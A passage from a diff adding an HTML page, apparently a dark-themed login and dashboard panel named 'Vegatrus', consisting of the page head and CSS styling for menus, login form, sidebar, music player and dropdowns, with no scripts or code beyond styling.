@@ -1,0 +1,2639 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Vegatrus - Access</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@500;600;700&family=VT323&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    /* ================= RESET & BASE ================= */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    body {
+      font-family: 'Rajdhani', sans-serif;
+      background: #000000;
+      color: #E0E0E0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* ================= BACKGROUND: FALLING STARS ================= */
+    .star-container {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      transform: rotate(45deg);
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .star {
+      position: absolute;
+      top: -10%;
+      left: 50%;
+      width: 100px;
+      height: 2px;
+      background: linear-gradient(90deg, #fff, transparent);
+      border-radius: 50%;
+      box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.1);
+      animation: meteor 3s linear infinite;
+      opacity: 0;
+    }
+
+    .star::before {
+      content: '';
+      position: absolute;
+      transform: translateY(-50%);
+      top: 50%;
+      width: 300px;
+      height: 1px;
+      background: linear-gradient(90deg, #fff, transparent);
+    }
+
+    @keyframes meteor {
+      0% { transform: rotate(180deg) translateX(0); opacity: 1; }
+      70% { opacity: 1; }
+      100% { transform: rotate(180deg) translateX(-1000px); opacity: 0; }
+    }
+
+    .star:nth-child(1) { top: 0; right: 0; left: auto; animation-delay: 0s; animation-duration: 2.5s; }
+    .star:nth-child(2) { top: 20%; right: 20%; left: auto; animation-delay: 0.5s; animation-duration: 3s; }
+    .star:nth-child(3) { top: 10%; right: 50%; left: auto; animation-delay: 1.2s; animation-duration: 2s; }
+    .star:nth-child(4) { top: 50%; right: 10%; left: auto; animation-delay: 1.8s; animation-duration: 2.2s; }
+    .star:nth-child(5) { top: 30%; right: 80%; left: auto; animation-delay: 2.5s; animation-duration: 3.5s; }
+
+    /* ================= WRAPPERS (Views) ================= */
+    .view-container {
+        width: 100%;
+        max-width: 380px;
+        padding: 20px;
+        position: relative;
+        z-index: 10;
+        display: none;
+        animation: fadeIn 0.5s ease;
+    }
+    
+    .view-container.active {
+        display: block;
+    }
+
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    /* ================= VIEW 1: HOME MENU ================= */
+    .top-bar {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 20px;
+        padding: 0 10px;
+    }
+
+    .welcome-badge {
+        background: rgba(255,255,255,0.1);
+        border: 1px solid rgba(255,255,255,0.2);
+        padding: 5px 15px;
+        border-radius: 20px;
+        font-size: 12px;
+        font-family: 'Orbitron';
+        color: #ddd;
+    }
+
+    .banner-card {
+        position: relative;
+        width: 100%;
+        height: 200px;
+        border-radius: 20px;
+        overflow: hidden;
+        border: 1px solid rgba(255,255,255,0.1);
+        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        margin-bottom: 30px;
+    }
+
+    .banner-img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        filter: brightness(0.5);
+    }
+
+    .banner-text {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-family: 'Orbitron', sans-serif;
+        font-size: 28px;
+        font-weight: 900;
+        color: #fff;
+        letter-spacing: 2px;
+        text-shadow: 0 0 10px rgba(255,255,255,0.5);
+        text-transform: uppercase;
+        width: 100%;
+        text-align: center;
+    }
+
+    .menu-btn {
+        width: 100%;
+        padding: 16px;
+        margin-bottom: 15px;
+        background: rgba(30, 30, 40, 0.8);
+        border: 1px solid rgba(60, 60, 100, 0.5);
+        border-radius: 12px;
+        color: #e0e0e0;
+        font-family: 'Rajdhani', sans-serif;
+        font-size: 18px;
+        font-weight: 700;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        transition: 0.3s;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+
+    .menu-btn:hover {
+        background: rgba(50, 50, 80, 0.9);
+        border-color: #00e5ff;
+        color: #fff;
+        transform: translateY(-2px);
+    }
+
+    .contact-section {
+        margin-top: 40px;
+        text-align: center;
+    }
+
+    .contact-label {
+        font-size: 12px;
+        color: #888;
+        letter-spacing: 2px;
+        margin-bottom: 15px;
+        text-transform: uppercase;
+    }
+
+    .social-row {
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+    }
+
+    .social-btn {
+        width: 50px;
+        height: 50px;
+        background: rgba(20,20,20,0.8);
+        border: 1px solid #333;
+        border-radius: 12px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 20px;
+        color: #fff;
+        cursor: pointer;
+        transition: 0.3s;
+        text-decoration: none;
+    }
+
+    .social-btn:hover {
+        background: #fff;
+        color: #000;
+        box-shadow: 0 0 15px rgba(255,255,255,0.5);
+    }
+
+    /* ================= VIEW 2: LOGIN FORM ================= */
+    .login-container {
+        background: rgba(10, 15, 20, 0.85);
+        border: 1px solid rgba(0, 229, 255, 0.1);
+        border-radius: 25px;
+        padding: 40px 25px;
+        text-align: center;
+        box-shadow: 0 0 40px rgba(0,0,0,0.8);
+        position: relative;
+    }
+
+    .profile-img {
+        width: 90px;
+        height: 90px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 2px solid #00e5ff;
+        box-shadow: 0 0 20px rgba(0, 229, 255, 0.4);
+        margin-bottom: 15px;
+    }
+
+    .login-title {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 22px;
+        color: #fff;
+        margin-bottom: 5px;
+        letter-spacing: 1px;
+    }
+
+    .login-subtitle {
+        font-size: 12px;
+        color: #777;
+        margin-bottom: 30px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+
+    .input-field-group {
+        position: relative;
+        margin-bottom: 20px;
+        text-align: left;
+    }
+
+    .input-style {
+        width: 100%;
+        padding: 15px 45px;
+        background: #050a10;
+        border: 1px solid #1f2a36;
+        border-radius: 12px;
+        color: #fff;
+        font-family: 'Rajdhani', sans-serif;
+        font-size: 16px;
+        outline: none;
+        transition: 0.3s;
+    }
+
+    .input-style:focus {
+        border-color: #00e5ff;
+        box-shadow: 0 0 10px rgba(0, 229, 255, 0.2);
+    }
+
+    .input-icon {
+        position: absolute;
+        left: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #00e5ff;
+        font-size: 16px;
+    }
+
+    .toggle-pass {
+        position: absolute;
+        right: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #555;
+        cursor: pointer;
+    }
+
+    .submit-btn {
+        width: 100%;
+        padding: 15px;
+        margin-top: 10px;
+        background: linear-gradient(90deg, #0093E9, #00e5ff);
+        border: none;
+        border-radius: 12px;
+        color: #fff;
+        font-family: 'Orbitron', sans-serif;
+        font-size: 16px;
+        font-weight: bold;
+        letter-spacing: 1px;
+        cursor: pointer;
+        box-shadow: 0 0 15px rgba(0, 229, 255, 0.3);
+        transition: 0.3s;
+    }
+
+    .submit-btn:hover {
+        transform: scale(1.02);
+        box-shadow: 0 0 25px rgba(0, 229, 255, 0.5);
+    }
+
+    /* ================= VIEW 3: LOADING SCREEN ================= */
+    .loading-screen {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: #000;
+        z-index: 3000;
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .video-wrapper {
+        width: 90%;
+        max-width: 500px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-radius: 15px;
+        overflow: hidden;
+        box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+        margin-bottom: 30px; 
+    }
+
+    .loading-video {
+        width: 100%;
+        height: auto;
+        display: block;
+    }
+
+    .loading-text {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 20px;
+        color: #fff;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+        animation: pulse 1.5s infinite;
+        margin-top: 20px;
+    }
+
+    @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+
+    /* ================= POPUP LOGIN ================= */
+    #loginPopup {
+        position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+        background: rgba(255,0,0,0.8); color: white; padding: 10px 20px;
+        border-radius: 8px; z-index: 9999; display: none;
+        font-family: 'Rajdhani'; font-weight: bold; border: 1px solid red;
+    }
+
+    /* ================= DASHBOARD STYLES ================= */
+    :root {
+        --bg-main: #02040a;       
+        --bg-card: #0b0f19;       
+        --primary: #3a6df0;       
+        --accent-red: #ff3b30;    
+        --accent-gold: #ffcc00;   
+        --text-main: #ffffff;
+        --text-sub: #8b9bb4;
+        --border-color: #1c2538;
+    }
+    
+    #dashboardView {
+      font-family: 'Rajdhani', sans-serif;
+      background: var(--bg-main);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: none;
+      flex-direction: column;
+      position: relative; 
+      overflow-x: hidden; 
+      padding-bottom: 80px;
+      width: 100%;
+      justify-content: flex-start;
+      align-items: stretch;
+    }
+    #dashboardView.active {
+      display: flex;
+    }
+
+    ::-webkit-scrollbar { width: 0px; }
+
+    .page-container { 
+        display: none; 
+        padding: 80px 20px 20px 20px; 
+        opacity: 0;
+        transform: translateY(10px);
+        transition: opacity 0.3s ease, transform 0.3s ease;
+    }
+    
+    .page-container.active { 
+        display: block; 
+        opacity: 1;
+        transform: translateY(0);
+    }
+
+    .custom-header {
+        position: fixed; top: 0; left: 0; width: 100%; height: 60px;
+        background: rgba(2, 4, 10, 0.95); backdrop-filter: blur(10px);
+        display: flex; align-items: center; justify-content: space-between;
+        padding: 0 20px; z-index: 1000;
+        border-bottom: 1px solid var(--border-color);
+        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+    }
+
+    .header-left { display: flex; align-items: center; gap: 15px; }
+    .header-title { font-family: 'Orbitron', sans-serif; font-size: 20px; font-weight: 700; color: #fff; letter-spacing: 1px; }
+    
+    #headerToggleBtn { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; }
+    
+    .profile-icon-header { width: 35px; height: 35px; border-radius: 50%; background: #1a1f2e; border: 1px solid var(--primary); display: flex; justify-content: center; align-items: center; color: var(--primary); font-size: 18px; cursor: pointer; }
+
+    #sidebarPanel {
+        position: fixed; top: 0; left: 0; width: 280px; height: 100vh;
+        background: #090c12; border-right: 1px solid var(--border-color); 
+        z-index: 2000; transform: translateX(-100%); 
+        transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        display: flex; flex-direction: column;
+        box-shadow: 5px 0 25px rgba(0,0,0,0.8);
+        overflow-y: auto;
+    }
+    #sidebarPanel.active { transform: translateX(0); }
+
+    .sidebar-video-box {
+        position: relative; width: 100%; height: 160px;
+        overflow: hidden; border-bottom: 1px solid var(--border-color);
+    }
+    .sidebar-video-bg { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
+    .sidebar-video-content {
+        position: absolute; bottom: 15px; left: 20px; right: 20px;
+        z-index: 2;
+    }
+    
+    .glitch-blue {
+        font-family: 'Orbitron'; font-size: 22px; font-weight: 900; color: #fff;
+        text-shadow: 2px 2px 0px #2a5298; letter-spacing: 2px;
+        position: relative; display: inline-block;
+    }
+    .glitch-blue::before, .glitch-blue::after {
+        content: 'SilentKiller'; position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.8;
+    }
+    .glitch-blue::before { color: #3a6df0; z-index: -1; animation: glitch-anim-1 2s infinite linear alternate-reverse; }
+    .glitch-blue::after { color: #1e3c72; z-index: -2; animation: glitch-anim-2 3s infinite linear alternate-reverse; }
+    
+    @keyframes glitch-anim-1 { 0% { clip: rect(20px, 9999px, 10px, 0); } 100% { clip: rect(50px, 9999px, 80px, 0); } }
+    @keyframes glitch-anim-2 { 0% { clip: rect(80px, 9999px, 10px, 0); } 100% { clip: rect(10px, 9999px, 90px, 0); } }
+
+    .user-coin-info {
+        display: flex; align-items: center; gap: 8px; font-size: 13px; color: #ccc;
+        margin-top: 5px; font-family: 'Rajdhani'; font-weight: bold;
+    }
+    .user-coin-info i { color: var(--primary); }
+
+    .sidebar-divider {
+        height: 1px; background: linear-gradient(90deg, transparent, var(--border-color), transparent);
+        margin: 10px 0;
+    }
+
+    .sidebar-menu { padding: 10px 20px; display: flex; flex-direction: column; gap: 8px; }
+    .sidebar-btn { 
+        background: transparent; border: none; color: var(--text-sub); 
+        text-align: left; font-family: 'Orbitron'; font-size: 14px; 
+        cursor: pointer; display: flex; align-items: center; gap: 15px; 
+        padding: 12px; border-radius: 8px; transition: 0.2s; 
+    }
+    .sidebar-btn:hover { background: rgba(58, 109, 240, 0.1); color: var(--primary); padding-left: 15px; }
+    .sidebar-btn i { width: 25px; text-align: center; }
+
+    .thanks-box { padding: 10px 20px 30px 20px; margin-top: auto; }
+    .thanks-title { font-family: 'Orbitron'; font-size: 14px; color: #fff; margin-bottom: 10px; letter-spacing: 1px; border-left: 3px solid var(--primary); padding-left: 10px; }
+    .thanks-list { font-family: 'Rajdhani'; font-size: 12px; color: #aaa; line-height: 1.6; }
+    .thanks-item { display: block; margin-bottom: 2px; font-weight: bold; }
+    .thanks-role { color: var(--text-sub); font-size: 10px; opacity: 0.7; }
+
+    #overlay { 
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+        background: rgba(0,0,0,0.8); z-index: 1500; 
+        display: none; backdrop-filter: blur(3px); 
+        opacity: 0; transition: opacity 0.3s ease; 
+        pointer-events: none;
+    }
+    #overlay.active { display: block; opacity: 1; pointer-events: auto; }
+
+    .lux-header-card {
+        background: linear-gradient(135deg, #1e3c72, #2a5298); 
+        border-radius: 20px; padding: 25px 20px; color: white;
+        box-shadow: 0 15px 30px rgba(30, 60, 114, 0.3);
+        margin-bottom: 30px; position: relative; overflow: hidden;
+        border: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    .lux-header-card.mini-card {
+        padding: 15px 20px;
+        margin-bottom: 20px;
+        min-height: auto;
+        background: url('https://files.catbox.moe/mmc3bg.jpg') no-repeat center center;
+        background-size: cover;
+        position: relative;
+        z-index: 1;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+    
+    .lux-header-card.mini-card::before {
+        content: '';
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(0, 0, 0, 0.75);
+        z-index: -1;
+    }
+    
+    .lux-head-custom-flex {
+        display: flex; justify-content: space-between; align-items: center; width: 100%;
+    }
+    .lux-left-info { display: flex; align-items: center; gap: 15px; }
+    .lux-right-info { text-align: right; }
+
+    .lux-icon-box { width: 50px; height: 50px; background: rgba(255,255,255,0.2); border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 24px; backdrop-filter: blur(5px); }
+    
+    .lux-head-text h2 { font-family: 'Orbitron'; font-size: 18px; margin-bottom: 2px; letter-spacing: 1px; }
+    .lux-head-text p { font-size: 12px; color: rgba(255,255,255,0.8); font-family: 'Rajdhani'; }
+
+    .welcome-text-anim {
+        font-family: 'Rajdhani';
+        font-weight: bold;
+        font-size: 11px;
+        color: var(--accent-gold);
+        margin-bottom: 2px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        min-height: 15px;
+        transition: opacity 0.5s ease;
+    }
+
+    .role-badge {
+        background: rgba(255, 255, 255, 0.1); 
+        border: 1px solid rgba(255, 255, 255, 0.3);
+        color: #ffffff;
+        padding: 4px 10px; 
+        border-radius: 6px; 
+        font-family: 'Orbitron'; 
+        font-size: 12px; 
+        font-weight: bold;
+        display: inline-block;
+        margin-top: 2px;
+        backdrop-filter: blur(2px);
+    }
+
+    .lux-mini-stats { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+    .lux-stat-glass { background: rgba(0,0,0,0.2); border-radius: 12px; padding: 12px 15px; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.1); }
+    .lux-stat-glass label { display: block; font-size: 11px; color: rgba(255,255,255,0.7); margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
+    .lux-stat-glass span { display: block; font-size: 18px; font-weight: bold; font-family: 'Orbitron'; }
+
+    .lux-section-title { font-family: 'Orbitron'; font-size: 16px; color: #fff; margin-bottom: 15px; letter-spacing: 1px; padding-left: 5px; border-left: 3px solid var(--primary); line-height: 1; }
+
+    .slider-container {
+        width: 100%; background: var(--bg-card); border-radius: 20px; overflow: hidden;
+        border: 1px solid var(--border-color); box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+        margin-bottom: 30px; position: relative; touch-action: pan-y; user-select: none;
+        height: 200px;
+    }
+    .slider-track { display: flex; width: 100%; height: 100%; cursor: grab; transition: transform 0.3s ease-out; }
+    .slider-track.grabbing { cursor: grabbing; transition: none; }
+    
+    .slide { 
+        min-width: 100%; height: 100%; position: relative; display: block; 
+    }
+    .slide video { 
+        width: 100%; height: 100%; object-fit: cover; display: block; 
+        border-bottom: 1px solid rgba(255,255,255,0.1); pointer-events: none; 
+    }
+    .lux-news-content { 
+        position: absolute; bottom: 0; left: 0; width: 100%; padding: 20px; 
+        display: flex; flex-direction: column; justify-content: flex-end;
+        background: linear-gradient(to top, rgba(0,0,0,0.95) 0%, rgba(0,0,0,0.6) 50%, transparent 100%);
+        z-index: 5;
+    }
+    .lux-news-content h3 { font-family: 'Orbitron'; font-size: 16px; color: #fff; margin-bottom: 5px; text-shadow: 0 2px 4px rgba(0,0,0,0.8); }
+    .lux-news-content p { font-size: 12px; color: #d0d0d0; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
+
+    .lux-stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
+    .lux-card { background: var(--bg-card); border-radius: 18px; padding: 18px; display: flex; align-items: center; gap: 12px; position: relative; overflow: hidden; transition: 0.3s; }
+    .glow-blue { border: 1px solid rgba(58, 109, 240, 0.3); box-shadow: 0 0 15px rgba(58, 109, 240, 0.1); }
+    .glow-red { border: 1px solid rgba(255, 59, 48, 0.3); box-shadow: 0 0 15px rgba(255, 59, 48, 0.1); }
+    .glow-gold { border: 1px solid rgba(255, 204, 0, 0.3); box-shadow: 0 0 15px rgba(255, 204, 0, 0.1); }
+
+    .lux-icon-circle { width: 42px; height: 42px; border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 20px; }
+    .bg-blue { background: rgba(58, 109, 240, 0.15); color: var(--primary); }
+    .bg-red { background: rgba(255, 59, 48, 0.15); color: var(--accent-red); }
+    .bg-gold { background: rgba(255, 204, 0, 0.15); color: var(--accent-gold); }
+
+    .lux-info label { display: block; font-size: 11px; color: var(--text-sub); margin-bottom: 3px; font-weight: 600; text-transform: uppercase; }
+    .lux-info span { display: block; font-size: 15px; font-weight: bold; font-family: 'Rajdhani'; letter-spacing: 0.5px; }
+    .lux-info span.blue { color: var(--primary); }
+    .lux-info span.red { color: var(--accent-red); }
+    .lux-info span.gold { color: var(--accent-gold); }
+    .lux-card-full { background: var(--bg-card); border-radius: 18px; padding: 18px; display: flex; align-items: center; gap: 15px; border: 1px solid rgba(255, 204, 0, 0.2); box-shadow: 0 0 20px rgba(255, 204, 0, 0.05); margin-bottom: 30px; }
+
+    .action-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; margin-top: 10px; margin-bottom: 30px; padding: 0 5px; }
+    .action-box {
+        background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 15px; padding: 15px 10px;
+        display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; cursor: pointer;
+        transition: all 0.2s ease; position: relative; overflow: hidden;
+    }
+    .action-box:hover { border-color: var(--primary); background: rgba(58, 109, 240, 0.05); transform: translateY(-3px); box-shadow: 0 5px 15px rgba(58, 109, 240, 0.1); }
+    .ab-icon { 
+        font-size: 24px; color: var(--primary); background: rgba(58, 109, 240, 0.1); 
+        width: 45px; height: 45px; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 5px;
+    }
+    .ab-title { font-family: 'Orbitron'; font-size: 12px; color: #fff; font-weight: bold; letter-spacing: 0.5px; }
+    .ab-sub { font-size: 10px; color: var(--text-sub); }
+
+    .page-back-header { display: flex; align-items: center; gap: 15px; background: linear-gradient(90deg, #1e3c72, #2a5298); padding: 15px; border-radius: 12px 12px 0 0; font-family: 'Orbitron'; font-size: 16px; color: #fff; font-weight: bold; }
+    .back-btn { background: none; border: none; color: #fff; font-size: 18px; cursor: pointer; }
+
+    .red-label-bar { width: 100%; background: linear-gradient(90deg, #1e3c72, #2a5298); color: #fff; padding: 10px 15px; font-family: 'Orbitron'; font-size: 14px; border-radius: 8px 8px 0 0; font-weight: bold; letter-spacing: 1px; margin-top: 20px; }
+    .dark-input-box { width: 100%; background: var(--bg-card); border: 1px solid var(--border-color); border-top: none; padding: 15px; color: #ccc; font-family: 'VT323'; font-size: 18px; border-radius: 0 0 8px 8px; outline: none; transition: 0.3s; }
+    .dark-input-box:focus { border-color: var(--primary); color: #fff; }
+
+    .video-banner-container {
+        position: relative; width: 100%; height: 180px; border-radius: 20px;
+        overflow: hidden; margin-bottom: 25px; border: 1px solid var(--border-color);
+        box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+    }
+    .video-banner-bg { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .video-overlay {
+        position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+        background: linear-gradient(90deg, rgba(0,0,0,0.7), rgba(0,0,0,0.3));
+        display: flex; flex-direction: column; justify-content: flex-end; padding: 20px;
+    }
+
+    .wa-video-container {
+        position: relative; width: 100%; height: 180px;
+        border-radius: 12px; overflow: hidden; margin-bottom: 25px;
+        border: 1px solid var(--border-color); box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+    }
+    .wa-video { width: 100%; height: 100%; object-fit: cover; }
+    .wa-overlay-text {
+        position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        font-family: 'Orbitron'; font-size: 24px; font-weight: 900;
+        color: rgba(255, 255, 255, 0.9);
+        text-shadow: 0 0 10px rgba(0,0,0,0.8);
+        white-space: nowrap; text-align: center; width: 100%;
+        transition: opacity 0.3s ease;
+    }
+    .glitch-subtle { animation: glitch-text-anim 3s infinite linear alternate-reverse; }
+    @keyframes glitch-text-anim {
+        0% { text-shadow: 2px 0 0 rgba(255,0,0,0.3), -2px 0 0 rgba(0,0,255,0.3); opacity: 1; }
+        20% { text-shadow: -2px 0 0 rgba(255,0,0,0.3), 2px 0 0 rgba(0,0,255,0.3); opacity: 0.9; }
+        40% { text-shadow: 2px 0 0 rgba(255,0,0,0.3), -2px 0 0 rgba(0,0,255,0.3); opacity: 1; }
+        100% { text-shadow: -2px 0 0 rgba(255,0,0,0.3), 2px 0 0 rgba(0,0,255,0.3); opacity: 0.95; }
+    }
+    
+    .music-visual-box {
+        position: relative; width: 100%; height: 220px; border-radius: 15px; 
+        overflow: hidden; margin-bottom: 20px; border: 1px solid var(--border-color);
+        box-shadow: 0 5px 25px rgba(0,0,0,0.6);
+        background: #000;
+    }
+    #musicVideoBg {
+        width: 100%; height: 100%; object-fit: cover;
+        opacity: 0; transition: opacity 2s ease;
+    }
+    #musicOverlayText {
+        position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        z-index: 15; width: 100%; text-align: center; font-family: 'Orbitron';
+        font-weight: 900; font-size: 22px; color: rgba(255,255,255,0.9);
+        text-shadow: 0 0 10px rgba(0,0,0,0.8); white-space: nowrap;
+        transition: opacity 0.3s ease;
+    }
+
+    .music-player-box {
+        background: #131722; padding: 20px; border-radius: 15px; 
+        border: 1px solid var(--border-color); text-align: center;
+    }
+    #musicTitle { 
+        font-family: 'Orbitron'; font-size: 18px; color: #fff; margin-bottom: 5px; 
+        min-height: 22px; transition: opacity 0.5s ease;
+    }
+    .music-sub { font-size: 12px; color: var(--text-sub); margin-bottom: 20px; }
+    
+    .progress-container {
+        width: 100%; height: 6px; background: #333; border-radius: 10px; 
+        margin-bottom: 10px; overflow: hidden; position: relative;
+    }
+    .progress-bar {
+        height: 100%; background: var(--primary); width: 0%; 
+        border-radius: 10px; transition: width 0.1s linear;
+        box-shadow: 0 0 10px var(--primary);
+    }
+    
+    .heartbeat-effect { animation: bar-pulse 0.6s infinite ease-in-out alternate; }
+    @keyframes bar-pulse {
+        0% { box-shadow: 0 0 5px var(--primary); opacity: 0.8; }
+        100% { box-shadow: 0 0 15px var(--primary); opacity: 1; filter: brightness(1.3); }
+    }
+
+    .time-display { 
+        display: flex; justify-content: space-between; font-size: 11px; 
+        color: var(--text-sub); font-family: 'VT323'; letter-spacing: 1px; margin-bottom: 15px;
+    }
+    
+    .controls { display: flex; justify-content: center; align-items: center; gap: 30px; }
+    .ctrl-btn { 
+        background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; transition: 0.2s; 
+    }
+    .ctrl-btn:active { transform: scale(0.9); }
+    .play-btn-circle {
+        width: 60px; height: 60px; border-radius: 50%; background: var(--primary);
+        display: flex; justify-content: center; align-items: center;
+        font-size: 24px; color: #fff; box-shadow: 0 0 20px rgba(58, 109, 240, 0.4);
+    }
+
+    .profile-info-box { background: #131722; border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+    .pi-row { display: flex; justify-content: space-between; border-bottom: 1px solid #1c2538; padding: 10px 0; font-family: 'Rajdhani'; color: #ccc; }
+    .pi-row:last-child { border-bottom: none; }
+    .pi-label { color: var(--text-sub); font-size: 14px; }
+    .pi-val { color: #fff; font-weight: bold; font-family: 'Orbitron'; letter-spacing: 1px; }
+
+    .slide-text-main {
+        font-family: 'Orbitron'; font-size: 22px; color: #fff;
+        font-weight: 900; text-transform: uppercase; letter-spacing: 1px;
+        white-space: nowrap; display: inline-block;
+        animation: moveText 8s linear infinite; text-shadow: 0 0 10px rgba(58, 109, 240, 0.8);
+    }
+    .slide-text-sub {
+        font-family: 'Rajdhani'; font-size: 12px; color: var(--primary);
+        font-weight: bold; margin-top: 2px; opacity: 0.8;
+    }
+    @keyframes moveText {
+        0% { transform: translateX(100%); }
+        100% { transform: translateX(-150%); }
+    }
+
+    .attack-dropdown-wrapper, .custom-dropdown-wrapper { 
+        position: relative; width: 100%; background: var(--bg-card); 
+        border: none; border-top: none; padding: 15px; border-radius: 8px; 
+        cursor: pointer; display: flex; justify-content: space-between; align-items: center; user-select: none; 
+        margin-bottom: 15px; 
+    }
+    .attack-dropdown-wrapper span, .custom-dropdown-wrapper span { color: #ccc; font-family: 'Orbitron'; font-size: 14px; }
+    .attack-dropdown-wrapper::after, .custom-dropdown-wrapper::after { content: '\f0d7'; font-family: 'Font Awesome 5 Free'; font-weight: 900; color: var(--primary); }
+    
+    .bug-options-container, .dropdown-options-container { 
+        position: absolute; top: 105%; left: 0; width: 100%; background: var(--bg-main); 
+        border: none; border-radius: 8px; overflow: hidden; max-height: 0; opacity: 0; visibility: hidden; 
+        transition: all 0.2s ease; z-index: 50; box-shadow: 0 10px 30px rgba(0,0,0,0.8); 
+    }
+    .bug-options-container.active, .dropdown-options-container.active { max-height: 300px; opacity: 1; visibility: visible; }
+    
+    .attack-option, .dropdown-option { 
+        padding: 12px 15px; border-bottom: none; 
+        color: var(--text-sub); font-family: 'Rajdhani'; font-weight: bold; cursor: pointer; transition: 0.2s; 
+    }
+    .attack-option:hover, .dropdown-option:hover { background: var(--primary); color: #fff; }
+
+    .yoshi-btn { width: 100%; padding: 16px; margin-top: 30px; background: linear-gradient(90deg, #1e3c72, #2a5298); border: none; border-radius: 50px; color: #fff; font-family: 'Orbitron'; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px rgba(58, 109, 240, 0.3); display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.2s; }
+    .yoshi-btn:active { transform: scale(0.98); }
+
+    .tools-grid-new { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+    .tool-box { 
+        padding: 20px; border-radius: 15px; 
+        background: var(--bg-card); border: 1px solid var(--border-color); 
+        cursor: pointer; min-height: 140px; 
+        display: flex; flex-direction: column; justify-content: center; 
+        transition: 0.3s; 
+    }
+    .tool-box:hover { border-color: var(--primary); background: rgba(58, 109, 240, 0.05); transform: translateY(-3px); }
+    .tool-box i { font-size: 28px; margin-bottom: 15px; color: var(--primary); }
+    .tool-box h3 { font-family: 'Orbitron'; font-size: 16px; margin-bottom: 5px; color: #fff; }
+    .tool-box p { font-size: 10px; opacity: 0.7; color: var(--text-sub); }
+
+    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; height: 70px; background: var(--bg-main); border-top: 1px solid var(--border-color); display: flex; justify-content: space-around; align-items: center; z-index: 1500; }
+    .nav-item { display: flex; flex-direction: column; align-items: center; gap: 5px; color: #555; cursor: pointer; width: 33%; transition: 0.3s; }
+    .nav-item i { font-size: 20px; transition: 0.3s; }
+    .nav-item span { font-size: 10px; font-family: 'Orbitron'; }
+    .nav-item.active { color: var(--primary); }
+    .nav-item.active i { transform: translateY(-5px); text-shadow: 0 0 10px var(--primary); }
+
+    .tt-result-card { margin-top: 20px; background: #131722; padding: 15px; border-radius: 10px; border: 1px solid var(--border-color); display: none; text-align: center; }
+    .tt-thumb { width: 100%; border-radius: 8px; margin-bottom: 10px; }
+    .tt-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
